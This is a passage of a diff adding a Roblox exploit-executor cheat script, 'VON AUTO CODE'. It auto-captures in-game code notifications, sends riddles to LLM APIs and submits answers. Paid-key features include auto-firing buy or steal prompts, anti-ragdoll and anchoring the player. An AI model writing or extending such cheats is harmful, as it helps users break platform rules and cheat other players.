+		flag14 = true
+
+		workspace.DescendantAdded:Connect(function(descendant)
+			if not flag10 or not flag11 then
+				return
+			end
+
+			task.defer(function()
+				if not flag10 or not flag11 then
+					return
+				end
+
+				if descendant:IsA("Texture") or descendant:IsA("Decal") or descendant:IsA("SurfaceAppearance") or descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Beam") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Sparkles") or descendant:IsA("Highlight") or descendant:IsA("AnimationController") then
+					pcall(function()
+						descendant:Destroy()
+					end)
+				end
+			end)
+		end)
+
+		Lighting.DescendantAdded:Connect(function(descendant)
+			if not flag10 or not flag11 then
+				return
+			end
+
+			if descendant:IsA("PostEffect") or descendant:IsA("Atmosphere") or descendant:IsA("Clouds") then
+				pcall(function()
+					descendant:Destroy()
+				end)
+			end
+		end)
+
+		MaterialService.DescendantAdded:Connect(function(descendant)
+			if not flag10 or not flag11 then
+				return
+			end
+
+			pcall(function()
+				descendant:Destroy()
+			end)
+		end)
+	end
+
+	fn24 = function()
+		task.spawn(function()
+			fn6("Optimizer: initial pass running…", Color3.fromRGB(255, 200, 90))
+			fn34()
+			fn35()
+			fn37()
+			fn38()
+			fn6("Optimizer: initial pass complete", Color3.fromRGB(120, 200, 120))
+		end)
+	end
+
+	localPlayer.CharacterAdded:Connect(function(character)
+		character:WaitForChild("Humanoid", 8)
+		task.wait(0.5)
+		if not flag11 then
+			return
+		end
+
+		if flag7 then
+			fn20()
+		end
+
+		if flag9 then
+			fn21(true)
+		end
+	end)
+
+	local v4 = nil
+	local n14 = 0
+	local n15 = 0
+
+	RunService.Heartbeat:Connect(function(deltaTime)
+		if not flag11 then
+			return
+		end
+
+		if flag9 then
+			local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+			if humanoidRootPart and humanoidRootPart:IsA("BasePart") and not humanoidRootPart.Anchored then
+				humanoidRootPart.Anchored = true
+			end
+		end
+
+		if flag10 then
+			n13 += deltaTime
+		end
+
+		if not flag8 then
+			return
+		end
+		n15 += deltaTime
+	end)
+end
+
+local v4
+
+v4 = lib.CreatePanel({
+	Name = "vonAutoCode",
+	Title = "VON AUTO CODE",
+	Width = 300,
+	Height = 250,
+	Tabs = { "Main", "Trigs", "AA", "AI", "UI", "Status" },
+	DefaultTab = 1,
+	Discord = true,
+	ClampToScreen = true,
+	ToggleKey = "RightShift",
+})
+
+gui = v4.Gui
+local v5, v6, v7, fn25, fn26, fn27, fn28, v8, v9, v10
+local v11, v12, v13
+
+do
+	local v14 = v4.GetTab(1)
+	local v15 = v4.GetTab(2)
+	local v16 = v4.GetTab(3)
+	v5 = v4.GetTab(4)
+	v6 = v4.GetTab(5)
+	v7 = v4.GetTab(6)
+
+	fn25 = function()
+		lib.SaveConfig("von_autocode")
+	end
+
+	fn26 = function()
+	end
+
+	fn27 = function()
+	end
+
+	local function fn29()
+		if module then
+			return module
+		end
+
+		pcall(function()
+			local notificationController = ReplicatedStorage:WaitForChild("Controllers", 5):WaitForChild("NotificationController", 5)
+			module = require(notificationController)
+		end)
+
+		return module
+	end
+
+	local function fn30()
+		pcall(function()
+			local sounds = ReplicatedStorage:FindFirstChild("Sounds")
+			sounds = sounds and sounds:FindFirstChild("Sfx")
+			sounds = sounds and sounds:FindFirstChild("Blop")
+			if not sounds then
+				return
+			end
+			local clone = sounds:Clone()
+			clone.Parent = v4.Frame
+			Debris:AddItem(clone, 0.5)
+			clone:Play()
+		end)
+	end
+
+	local function fn31(text, arg)
+		local topNotification = playerGui:FindFirstChild("TopNotification")
+
+		if not topNotification then
+			topNotification = Instance.new("ScreenGui")
+			topNotification.Name = "TopNotification"
+			topNotification.ResetOnSpawn = false
+			topNotification.DisplayOrder = 100
+			topNotification.Parent = playerGui
+			local frame = Instance.new("Frame")
+			frame.Name = "TopNotification"
+			frame.Size = UDim2.new(1, 0, 0.2, 0)
+			frame.Position = UDim2.new(0, 0, 0, 0)
+			frame.BackgroundTransparency = 1
+			frame.Parent = topNotification
+		end
+
+		local topNotification2 = topNotification:FindFirstChild("TopNotification")
+		if not topNotification2 then
+			return
+		end
+		local frame = Instance.new("Frame")
+		frame.Name = "Notification"
+		frame.Size = UDim2.new(0.5, 0, 0, 50)
+		frame.Position = UDim2.new(0.25, 0, 0, 10)
+		frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+		frame.BorderSizePixel = 0
+		frame.Parent = topNotification2
+		local uiCorner = Instance.new("UICorner")
+		uiCorner.CornerRadius = UDim.new(0, 8)
+		uiCorner.Parent = frame
+		local uiStroke = Instance.new("UIStroke")
+		uiStroke.Color = Color3.fromRGB(100, 200, 255)
+		uiStroke.Thickness = 2
+		uiStroke.Parent = frame
+
+		if arg and arg ~= 0 and arg ~= "" then
+			local imageLabel = Instance.new("ImageLabel")
+			imageLabel.BackgroundTransparency = 1
+			imageLabel.Size = UDim2.fromScale(1, 1)
+			imageLabel.SizeConstraint = Enum.SizeConstraint.RelativeYY
+			imageLabel.Position = UDim2.fromScale(0, 0.4) + UDim2.fromOffset(-12, 0)
+			imageLabel.AnchorPoint = Vector2.new(1, 0.5)
+			imageLabel.Image = type(arg) == "string" and arg or "rbxthumb://type=AvatarHeadShot&id=" .. tostring(arg) .. "&w=420&h=420"
+			imageLabel.Parent = frame
+			local uiCorner2 = Instance.new("UICorner")
+			uiCorner2.CornerRadius = UDim.new(0.12, 0)
+			uiCorner2.Parent = imageLabel
+		end
+
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Name = "Text"
+		textLabel.Size = UDim2.new(1, -20, 1, 0)
+		textLabel.Position = UDim2.new(0, 10, 0, 0)
+		textLabel.BackgroundTransparency = 1
+		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+		textLabel.TextSize = 14
+		textLabel.Font = Enum.Font.Gotham
+		textLabel.Text = text
+		textLabel.TextWrapped = true
+		textLabel.Parent = frame
+		TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0.25, 0, 0.05, 0) }):Play()
+
+		task.delay(5, function()
+			if not (frame and frame.Parent) then
+				return
+			end
+			local tween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Position = UDim2.new(0.25, 0, -0.1, 0) })
+
+			tween.Completed:Connect(function()
+				if frame then
+					frame:Destroy()
+				end
+			end)
+
+			tween:Play()
+		end)
+	end
+
+	local function fn32(arg)
+		if arg == "" then
+			return localPlayer.UserId
+		end
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player.Name == arg or player.DisplayName == arg then
+				return player.UserId
+			end
+		end
+
+		local ok, result = pcall(function()
+			return Players:GetUserIdFromNameAsync(arg)
+		end)
+
+		return ok and result or localPlayer.UserId
+	end
+
+	local function fn33(arg, arg2)
+		local str10 = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
+		local str11 = tostring(arg2 or ""):gsub("^%s+", ""):gsub("%s+$", "")
+		if str11 == "" then
+			fn6("Test Notification: enter a message first", Color3.fromRGB(255, 200, 90))
+			return
+		end
+
+		task.spawn(function()
+			fn30()
+			local v17 = fn32(str10)
+			local v18 = fn29()
+
+			if v18 then
+				if pcall(function()
+					v18:Notify(str11, 5, nil, "Top", v17)
+				end) then
+					fn6("Test Notification sent via controller: " .. str11, Color3.fromRGB(120, 200, 120))
+					return
+				end
+			end
+
+			fn31(str11, v17)
+			fn6("Test Notification sent via fallback GUI: " .. str11, Color3.fromRGB(120, 200, 120))
+		end)
+	end
+
+	local v17 = lib.CreateKeyValue(v14, {
+		Label = "Whitelist",
+		Value = "Locked",
+		Tooltip = "AI features require a valid key tied to your HWID",
+	})
+
+	fn28 = function()
+		if flag11 then
+			v17.SetValue("✓ " .. tostring(username or "User"))
+		else
+			v17.SetValue("Locked")
+		end
+
+		fn26()
+	end
+
+	local v18 = nil
+
+	local function fn34()
+		if v18 and v18.Gui and v18.Gui.Parent then
+			v18.SetVisible(true)
+			return
+		end
+		v18 = lib.CreatePanel({ Name = "vonKeySystem", Title = "VON KEY SYSTEM", Width = 300, Height = 300, ClampToScreen = true })
+		local content = v18.Content
+
+		lib.CreateParagraph(content, {
+			Title = "Whitelist required",
+			Content = "Enter your key to unlock the AI features. Access is tied to this HWID and can be saved for future executions.",
+		})
+
+		local v19 = lib.CreateTextInput(content, { Label = "Key", Placeholder = "paste key…", Width = 150 })
+		local flag13 = true
+
+		lib.CreateToggle(content, {
+			Label = "Save key for future runs",
+			Default = true,
+			OnChanged = function(arg)
+				flag13 = arg
+			end,
+		})
+
+		lib.CreateButton(content, {
+			Text = "Authenticate",
+			Tooltip = "Validate the key against the whitelist server",
+			OnClick = function()
+				local v20 = v19.GetValue()
+				lib.ShowNotification("VON Key System", "Checking key…", 2)
+				local ok, result, result2 = pcall(fn12, v20)
+
+				if not ok then
+					local color = Color3.fromRGB
+					fn6("Whitelist: authentication errored – " .. tostring(result), color(220, 80, 80))
+					lib.ShowNotification("VON Key System", "Error: " .. tostring(result), 6)
+					return
+				end
+
+				if result then
+					if flag13 then
+						fn9(v20)
+					else
+						fn11()
+					end
+
+					local ok2, result3 = pcall(fn28)
+
+					if not ok2 then
+						local color = Color3.fromRGB
+						fn6("Whitelist: authenticated, but applying the unlock failed – " .. tostring(result3), color(255, 200, 90))
+					end
+
+					lib.ShowNotification("VON Key System", "Authenticated as " .. tostring(result2), 4)
+
+					if not v then
+						task.spawn(fn13)
+					end
+
+					pcall(v18.Close)
+				else
+					lib.ShowNotification("VON Key System", "Denied: " .. tostring(result2), 5)
+					fn6("Whitelist: " .. tostring(result2), Color3.fromRGB(220, 80, 80))
+				end
+			end,
+		})
+
+		if typeof(setclipboard) == "function" then
+			lib.CreateButton(content, {
+				Text = "Purchase",
+				OnClick = function()
+					setclipboard("https://discord.gg/rNvAU6cjVB")
+					lib.ShowNotification("VON Key System", "Link copied to clipboard", 3)
+				end,
+			})
+		end
+
+		lib.CreateButton(content, {
+			Text = "Log out / forget key",
+			Tooltip = "Clear saved access on this machine and re-lock the AI",
+			OnClick = function()
+				flag11 = false
+				username = nil
+				v3 = nil
+				fn11()
+				fn28()
+				lib.ShowNotification("VON Key System", "Access cleared on this machine", 3)
+			end,
+		})
+	end
+
+	lib.CreateButton(v14, {
+		Text = "🔒 Key System / Whitelist",
+		Tooltip = "Authenticate to unlock AI features",
+		OnClick = fn34,
+	})
+
+	v8 = lib.CreateButton(v14, {
+		Text = "Apply Recommended Config (Free)",
+		Tooltip = "Sets the settings we recommend. Anything not part of the recommended set is left exactly as you have it.",
+		Confirm = true,
+		ConfirmText = "Apply? Overwrites those settings",
+		OnClick = function()
+			fn27()
+		end,
+	})
+
+	local function fn35()
+		local v19 = n2
+		fn15()
+		flag3 = true
+		n6 = v19
+		flag4 = true
+		fn6("Force Scan started – collecting " .. v19 .. " notification(s)", Color3.fromRGB(255, 200, 90))
+	end
+
+	local function fn36()
+		if not flag11 then
+			fn6("Force AI: locked – authenticate in the Key System first", Color3.fromRGB(220, 80, 80))
+			fn34()
+			return
+		end
+
+		if not flag5 then
+			fn6("Force AI: denied – code tracking hasn't started yet")
+			return
+		end
+		flag6 = true
+		fn6("Force AI armed – next notification goes to the AI", Color3.fromRGB(255, 200, 90))
+	end
+
+	lib.CreateButton(v14, {
+		Text = "Force Scan + Code",
+		Tooltip = "Capture the next N notifications verbatim, then redeem.",
+		OnClick = fn35,
+	})
+
+	lib.CreateButton(v14, {
+		Text = "Force AI Answer",
+		Tooltip = "Send the next notification to the AI, ignoring toggle + thresholds.",
+		OnClick = fn36,
+	})
+
+	local v19 = lib.CreateKeybind(v14, {
+		Label = "Force Scan Key",
+		Tooltip = "Press this key to run Force Scan + Code",
+		Flag = "forceScanKey",
+		OnChanged = function()
+			fn25()
+		end,
+	})
+
+	local v20 = lib.CreateKeybind(v14, {
+		Label = "Force AI Key",
+		Tooltip = "Press this key to arm Force AI Answer",
+		Flag = "forceAiKey",
+		OnChanged = function()
+			fn25()
+		end,
+	})
+
+	UserInputService.InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then
+			return
+		end
+
+		if input.UserInputType ~= Enum.UserInputType.Keyboard then
+			return
+		end
+		local keyCode = input.KeyCode
+
+		if keyCode == v19.GetValue() then
+			fn35()
+		end
+
+		if keyCode == v20.GetValue() then
+			fn36()
+		end
+	end)
+
+	v9 = lib.CreateDropdown(v14, {
+		Label = "Code Entry",
+		Options = { "Firesignal" },
+		Default = "Firesignal",
+		Placeholder = "Firesignal",
+		Tooltip = "Firesignal fills the box and clicks Confirm. Remote calls the RemoteFunction directly (faster, whitelist only).",
+		Flag = "entryMethod",
+		OnChanged = function(entryMethod)
+			if entryMethod == nil then
+				return
+			end
+			tbl12.entryMethod = entryMethod
+
+			if entryMethod == "Remote" and not flag11 then
+				fn6("Code Entry: Remote is whitelist-only – staying on Firesignal (kept as your choice for when you authenticate)", Color3.fromRGB(220, 80, 80))
+				str8 = "firesignal"
+				fn25()
+				return
+			end
+
+			str8 = entryMethod == "Remote" and "remote" or "firesignal"
+			fn6("Code Entry method → " .. str8)
+			fn25()
+		end,
+	})
+
+	v10 = lib.CreateDropdown(v14, {
+		Label = "Scan Source",
+		Options = { "ChildAdded" },
+		Default = "ChildAdded",
+		Placeholder = "ChildAdded",
+		Tooltip = "ChildAdded watches PlayerGui text. Controller intercepts the notification itself, which fires earlier (whitelist only).",
+		Flag = "scanMode",
+		OnChanged = function(scanMode)
+			if scanMode == nil then
+				return
+			end
+			tbl12.scanMode = scanMode
+
+			if scanMode == "Controller" and not flag11 then
+				fn6("Scan Source: Controller is whitelist-only – staying on ChildAdded (kept as your choice for when you authenticate)", Color3.fromRGB(220, 80, 80))
+				str9 = "childadded"
+				fn25()
+				return
+			end
+
+			str9 = scanMode == "Controller" and "controller" or "childadded"
+			fn6("Scan Source → " .. str9)
+			fn25()
+		end,
+	})
+
+	for _, v21 in ipairs({ "entryMethod", "scanMode" }) do
+		local v22 = lib.Flags[v21]
+
+		if v22 then
+			v22.Get = function()
+				return tbl12[v21]
+			end
+		end
+	end
+
+	local v21 = lib.CreateSection(v14, {
+		Title = "Test Notification",
+		Open = false,
+		Tooltip = "Fire a fake Top notification to test the scanner without waiting for a real code.",
+	})
+
+	local v22 = lib.CreateTextInput(v21.Content, {
+		Label = "Avatar User",
+		Placeholder = "blank = you",
+		Width = 150,
+		Tooltip = "Username to show the avatar of. Cosmetic only.",
+	})
+
+	local v23 = lib.CreateTextInput(v21.Content, {
+		Label = "Message",
+		Placeholder = "notification text",
+		Width = 150,
+		Tooltip = "Sent as a Top notification. Include a trigger keyword to test the full collect + redeem path.",
+	})
+
+	lib.CreateButton(v21.Content, {
+		Text = "Send Test Notification",
+		Tooltip = "Sends a real Top notification.",
+		OnClick = function()
+			local getValue = v23.GetValue
+			fn33(v22.GetValue(), getValue())
+		end,
+	})
+
+	lib.CreateParagraph(v21.Content, {
+		Title = "Heads up",
+		Content = "This fires a genuine Top notification, so the scanner will treat it as real. With Auto Enter Code on, a message that matches your triggers will start a collection and eventually submit a code.",
+	})
+
+	lib.CreateToggle(v14, {
+		Label = "Auto Enter Code",
+		Default = true,
+		Flag = "autoCode",
+		OnChanged = function(arg)
+			flag = arg
+			fn25()
+		end,
+	})
+
+	lib.CreateTextInput(v14, {
+		Label = "Submit Code After",
+		Placeholder = "0",
+		Default = "3",
+		Width = 44,
+		NumericOnly = true,
+		Tooltip = "Notifications to collect when the first one after the trigger is BELOW the AI thresholds, i.e. a plain code spelled out in pieces. Recommended: 3.",
+		Flag = "captureCount",
+		OnSubmit = function(arg)
+			n2 = tonumber(arg) or 0
+			fn15()
+			fn25()
+		end,
+	})
+
+	lib.CreateTextInput(v14, {
+		Label = "Submit Riddle After",
+		Placeholder = "0",
+		Default = "1",
+		Width = 44,
+		NumericOnly = true,
+		Tooltip = "Notifications to collect when the first one after the trigger MEETS both AI thresholds (Min Characters and Min Spaces, AI tab) — that, and nothing else, is what marks it a riddle. A riddle is one answer, so 1 is recommended.",
+		Flag = "riddleCount",
+		OnSubmit = function(arg)
+			n3 = tonumber(arg) or 0
+			fn15()
+			fn25()
+		end,
+	})
+
+	lib.CreateInputList(v15, {
+		Label = "Triggers  (blank = all)",
+		Count = 10,
+		Height = 183,
+		Defaults = tbl9,
+		Flag = "triggers",
+		Placeholder = function(arg)
+			return "keyword " .. arg
+		end,
+		OnChanged = function(arg, arg2)
+			tbl9[arg] = arg2
+			fn25()
+		end,
+	})
+
+	lib.CreateParagraph(v16, {
+		Title = "Whitelist required",
+		Content = "These toggles need a valid key. They stay disabled and inert until you authenticate in the Key System on the Main tab.",
+	})
+
+	v11 = lib.CreateToggle(v16, {
+		Label = "Anti Ragdoll",
+		Default = false,
+		Tooltip = "Strips ragdoll constraints and forces the humanoid back to Running the moment it gets ragdolled.",
+		Flag = "antiRagdoll",
+		OnChanged = function(antiRagdoll)
+			tbl12.antiRagdoll = antiRagdoll
+
+			if antiRagdoll and not flag11 then
+				fn6("Anti Ragdoll: locked – authenticate first (kept as your choice)", Color3.fromRGB(220, 80, 80))
+				flag7 = false
+				fn25()
+				return
+			end
+
+			flag7 = antiRagdoll
+
+			if antiRagdoll then
+				fn20()
+			end
+
+			fn6("Anti Ragdoll → " .. tostring(antiRagdoll))
+			fn25()
+		end,
+	})
+
+	v12 = lib.CreateToggle(v16, {
+		Label = "Auto Buy",
+		Default = false,
+		Tooltip = "Fires the nearest buy/purchase/claim/steal/collect ProximityPrompt in range.",
+		Flag = "autoBuy",
+		OnChanged = function(autoBuy)
+			tbl12.autoBuy = autoBuy
+
+			if autoBuy and not flag11 then
+				fn6("Auto Buy: locked – authenticate first (kept as your choice)", Color3.fromRGB(220, 80, 80))
+				flag8 = false
+				fn25()
+				return
+			end
+
+			flag8 = autoBuy
+
+			if autoBuy then
+				fn22()
+			end
+
+			fn6("Auto Buy → " .. tostring(autoBuy))
+			fn25()
+		end,
+	})
+
+	v13 = lib.CreateToggle(v16, {
+		Label = "Anchor Player",
+		Default = false,
+		Tooltip = "Anchors HumanoidRootPart. Total freeze – immune to knockback, falling and conveyors, but you can float in mid-air.",
+		Flag = "anchorPlayer",
+		OnChanged = function(anchorPlayer)
+			tbl12.anchorPlayer = anchorPlayer
+
+			if anchorPlayer and not flag11 then
+				fn6("Anchor Player: locked – authenticate first (kept as your choice)", Color3.fromRGB(220, 80, 80))
+				flag9 = false
+				fn25()
+				return
+			end
+
+			flag9 = anchorPlayer
+			fn21(anchorPlayer)
+			fn6("Anchor Player → " .. tostring(anchorPlayer))
+			fn25()
+		end,
+	})
+
+	local v24 = lib.CreateToggle(v16, {
+		Label = "FPS Optimizer",
+		Default = false,
+		Tooltip = "Strips textures, particles, lights, shadows and post-effects, then re-sweeps every 2s. PERMANENT – turning it back off cannot restore anything, you have to rejoin.",
+		OnChanged = function(arg, arg2)
+			if arg and not flag11 then
+				fn6("Optimizer: locked – authenticate first", Color3.fromRGB(220, 80, 80))
+				flag10 = false
+
+				if arg2 then
+					arg2(false)
+				end
+
+				return
+			end
+
+			flag10 = arg
+
+			if arg then
+				fn23()
+				fn24()
+				fn6("Optimizer ON – this is permanent for the session, rejoin to undo", Color3.fromRGB(255, 200, 90))
+			else
+				fn6("Optimizer OFF – already-stripped visuals stay gone until you rejoin", Color3.fromRGB(255, 200, 90))
+			end
+		end,
+	})
+
+	lib.CreateParagraph(v16, {
+		Title = "FPS Optimizer is destructive",
+		Content = [[It Destroy()s textures, decals, particles, trails, beams, lights, highlights, post-effects and atmosphere, and deletes any workspace child outside its whitelist. Player characters and UUID-named objects are kept.
+
+Switching it off only stops it removing new things — nothing comes back without rejoining.
+
+It can also delete ProximityPrompts, so Auto Buy may stop finding anything while this is on.
+
+Unlike every other setting here it is NOT saved — it starts off each time you execute the script, so it can never wipe the map on load without you asking.]],
+	})
+
+	local function fn37(arg)
+		if arg and not flag11 then
+			return
+		end
+		flag10 = arg
+		v24.Set(arg)
+
+		if arg then
+			fn23()
+			fn24()
+			fn6("Optimizer ON – this is permanent for the session, rejoin to undo", Color3.fromRGB(255, 200, 90))
+		end
+	end
+
+	v11.SetDisabled(true)
+	v12.SetDisabled(true)
+	v13.SetDisabled(true)
+	v24.SetDisabled(true)
+
+	for _, v25 in ipairs({ "antiRagdoll", "autoBuy", "anchorPlayer" }) do
+		local v26 = lib.Flags[v25]
+
+		if v26 then
+			v26.Get = function()
+				return tbl12[v25]
+			end
+		end
+	end
+
+	lib.CreateToggle(v5, {
+		Label = "Use AI Answers",
+		Default = false,
+		Flag = "aiEnabled",
+		OnChanged = function(arg)
+			flag2 = arg
+			fn25()
+
+			if arg and not flag11 and flag12 then
+				lib.ShowNotification("VON", "AI is locked — authenticate in the Key System (Main tab)", 4)
+				fn34()
+			end
+		end,
+	})
+
+	lib.CreateTextInput(v5, {
+		Label = "Min Characters",
+		Placeholder = "0",
+		Default = "10",
+		Width = 44,
+		NumericOnly = true,
+		Flag = "aiMinChars",
+		Tooltip = "A notification this long AND with at least Min Spaces spaces counts as a riddle: it uses Submit Riddle After and goes to the AI. Anything shorter is treated as a plain code.",
+		OnSubmit = function(arg)
+			n4 = tonumber(arg) or 0
+			fn25()
+		end,
+	})
+
+	lib.CreateTextInput(v5, {
+		Label = "Min Spaces",
+		Placeholder = "0",
+		Default = "1",
+		Width = 44,
+		Tooltip = "The second half of the riddle test. Codes arrive as one unspaced chunk, so even 1 separates them from a sentence.",
+		NumericOnly = true,
+		Flag = "aiMinSpaces",
+		OnSubmit = function(arg)
+			n5 = tonumber(arg) or 0
+			fn25()
+		end,
+	})
+
+	lib.CreateParagraph(v5, {
+		Title = "How answers work",
+		Content = [[The AI is sent the pastefy data and the notification text. Nothing else.
+
+The two thresholds above are the riddle test, and they are the whole test — the words "code is", "riddle" or "question is" have no say in it. Those are only Triggers: they decide when to start listening, never how much to collect.
+
+A trigger opens the collection. The first notification after it is measured: meets BOTH thresholds → riddle, so it collects Submit Riddle After notifications and is answered by the AI. Misses either → code, so it collects Submit Code After notifications and is taken literally.
+
+So with Riddle After 1, "code is" followed by "my favourite brainrot and 67 at the end" submits the answer immediately instead of waiting for two more notifications. The Status tab logs the character and space count behind every decision.]],
+	})
+
+	local createDropdown = nil
+
+	lib.CreateDropdown(v5, {
+		Label = "Provider",
+		Options = tbl5,
+		Default = "Groq",
+		Tooltip = "All three are free and need no card. Every one needs a key you paste below.",
+		Flag = "aiProvider",
+		OnChanged = function(arg)
+			str2 = tbl4[arg] or "groq"
+			local tbl13 = tbl8[str2] or { "openai/gpt-oss-20b" }
+
+			if createDropdown then
+				createDropdown.SetItems(tbl13, true)
+			end
+
+			local v25 = createDropdown and createDropdown.GetValue() or nil
+
+			if v25 ~= nil and v25 ~= "" then
+				str4 = v25
+			else
+				str4 = tbl13[1]
+				local aiModel = lib.Flags.aiModel
+
+				if aiModel then
+					pcall(aiModel.Set, tbl13[1])
+				end
+			end
+
+			fn6("AI provider → " .. str2 .. " (model " .. fn4() .. ")")
+			fn25()
+		end,
+	})
+
+	lib.CreateTextInput(v5, {
+		Label = "API Key",
+		Placeholder = "paste key…",
+		Width = 190,
+		Flag = "aiUserKey",
+		Tooltip = "Required. There is no built-in key — see Getting a key below.",
+		OnSubmit = function(arg)
+			str3 = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
+			fn6("AI key " .. (str3 ~= "" and "set (" .. #str3 .. " chars)" or "cleared"))
+			fn25()
+		end,
+	})
+
+	createDropdown = lib.CreateDropdown
+
+	createDropdown = createDropdown(v5, {
+		Label = "Model",
+		Options = tbl8.groq,
+		Default = tbl8.groq[1],
+		Tooltip = "Presets for the selected provider. Overridden by Custom Model ID below.",
+		Flag = "aiModel",
+		OnChanged = function(arg)
+			if arg == nil then
+				return
+			end
+			str4 = arg
+			fn25()
+		end,
+	})
+
+	lib.CreateTextInput(v5, {
+		Label = "Custom Model ID",
+		Placeholder = "blank = use preset",
+		Width = 190,
+		Flag = "aiCustomModel",
+		Tooltip = "Any model ID the provider accepts. Overrides the Model dropdown.",
+		OnSubmit = function(arg)
+			str5 = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
+			fn6("AI model → " .. fn4())
+			fn25()
+		end,
+	})
+
+	lib.CreateParagraph(v5, {
+		Title = "Getting a key",
+		Content = [[There is no built-in key. Pick a provider, make a key on its site, paste it above. All of them are free and none asks for a card. Speeds are measured output tokens/second.
+
+Cerebras — cloud.cerebras.ai. gpt-oss-120b ~3000 t/s, the fastest here by far and free (no card, daily token cap). Start with this one.
+
+Groq — console.groq.com/keys. openai/gpt-oss-20b ~965 t/s. Fast, and generous on requests: 1000 requests/day, but only 8k tokens/minute, and one question costs about 5k with the pastefy data attached — so roughly one answer a minute.
+
+SambaNova — cloud.sambanova.ai/apis. gpt-oss-120b ~710 t/s. Free tier is 20 requests a DAY (that is what you get with no payment method on the account). Backup only.
+
+Gemini — aistudio.google.com/apikey. 3.5 Flash-Lite ~389 t/s, 3.7 Flash ~340 t/s. Slower than the other two — nothing Google serves is near 700 — but it allows far more requests per day than any of them, so it is the one to use if you are hitting rate limits rather than waiting on answers.
+
+Your key is saved in plain text inside von_autocode.json in your executor's workspace folder, same as every other setting.]],
+	})
+
+	if typeof(setclipboard) == "function" then
+		lib.CreateButton(v5, {
+			Text = "Copy Cerebras key page",
+			OnClick = function()
+				setclipboard(tbl7.cerebras)
+				lib.ShowNotification("VON", "Cerebras link copied (free, fastest)", 3)
+			end,
+		})
+
+		lib.CreateButton(v5, {
+			Text = "Copy Groq key page",
+			OnClick = function()
+				setclipboard(tbl7.groq)
+				lib.ShowNotification("VON", "Groq link copied (free)", 3)
+			end,
+		})
+
+		lib.CreateButton(v5, {
+			Text = "Copy SambaNova key page",
+			OnClick = function()
+				setclipboard(tbl7.sambanova)
+				lib.ShowNotification("VON", "SambaNova link copied (free)", 3)
+			end,
+		})
+
+		lib.CreateButton(v5, {
+			Text = "Copy Gemini key page",
+			OnClick = function()
+				setclipboard(tbl7.gemini)
+				lib.ShowNotification("VON", "Google AI Studio link copied (free)", 3)
+			end,
+		})
+	end
+
+	local function fn38(arg, color, color2)
+		if not arg or not arg.Parent then
+			return
+		end
+
+		for _, descendant in ipairs(arg:GetDescendants()) do
+			if descendant:IsA("UIStroke") then
+				descendant.Color = color2
+			elseif descendant:IsA("ScrollingFrame") then
+				descendant.ScrollBarImageColor3 = color2
+			end
+		end
+
+		local frame = arg:FindFirstChildWhichIsA("Frame")
+
+		if frame then
+			local uiStroke = frame:FindFirstChildOfClass("UIStroke")
+
+			if uiStroke then
+				uiStroke.Color = color
+			end
+		end
+	end
+
+	local flag13 = false
+
+	local function fn39()
+		if flag13 then
+			return
+		end
+		flag13 = true
+
+		task.delay(0.4, function()
+			flag13 = false
+			fn25()
+		end)
+	end
+
+	local flag14 = false
+
+	local function fn40()
+		if flag14 then
+			return
+		end
+		flag14 = true
+
+		task.delay(0.08, function()
+			flag14 = false
+			fn38(v4.Gui, lib.Theme.Accent, lib.Theme.AccentDim)
+
+			if v18 and v18.Gui then
+				fn38(v18.Gui, lib.Theme.Accent, lib.Theme.AccentDim)
+			end
+
+			v4.SetTab(v4.GetActiveTab())
+		end)
+	end
+
+	local function fn41(arg)
+		if typeof(arg) ~= "Color3" then
+			return
+		end
+		fn(arg)
+		fn40()
+	end
+
+	lib.CreateColorPicker(v6, {
+		Label = "Accent Colour",
+		Default = accent,
+		Tooltip = "Live preview – repaints most of the UI right away. Re-execute the script to apply it everywhere.",
+		Flag = "accent",
+		OnChanged = function(arg)
+			fn41(arg)
+			fn39()
+		end,
+	})
+
+	local n13 = 100
+	local n14 = 27
+	local scale = 1
+	local n15 = 100
+	local flag15 = false
+
+	local function fn42()
+		local uiScale = v4.Frame:FindFirstChildOfClass("UIScale")
+
+		if not uiScale then
+			uiScale = Instance.new("UIScale")
+			uiScale.Parent = v4.Frame
+		end
+
+		local shadow = v4.Gui:FindFirstChild("Shadow")
+		local uiScale2 = shadow and shadow:FindFirstChildOfClass("UIScale")
+
+		if shadow and not uiScale2 then
+			uiScale2 = Instance.new("UIScale")
+			uiScale2.Parent = shadow
+		end
+
+		return uiScale, shadow, uiScale2
+	end
+
+	local function fn43()
+		local v25, v26 = fn42()
+		if not v26 then
+			return
+		end
+		local position = v4.Frame.Position
+		v26.Position = UDim2.new(position.X.Scale, position.X.Offset - n14 * scale, position.Y.Scale, position.Y.Offset - n14 * scale + 5)
+	end
+
+	local function fn44(arg)
+		scale = math.clamp((tonumber(arg) or 100) / 100, 0.5, 1.5)
+		local v25, v26, v27 = fn42()
+
+		if v25 then
+			v25.Scale = scale
+		end
+
+		if v27 then
+			v27.Scale = scale
+		end
+
+		fn43()
+	end
+
+	pcall(function()
+		v4.Frame:GetPropertyChangedSignal("Position"):Connect(fn43)
+		v4.Frame:GetPropertyChangedSignal("Size"):Connect(fn43)
+	end)
+
+	local function fn45()
+	end
+
+	UserInputService.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			flag15 = true
+		end
+	end)
+
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			flag15 = false
+			fn45()
+		end
+	end)
+
+	lib.CreateSlider(v6, {
+		Label = "UI Size",
+		Min = 50,
+		Max = 150,
+		Default = 100,
+		Step = 5,
+		Format = "%d%%",
+		Tooltip = "Scales the whole panel. Applies when you let go of the slider.",
+		Flag = "uiScale",
+		OnChanged = function(arg)
+			n13 = arg
+		end,
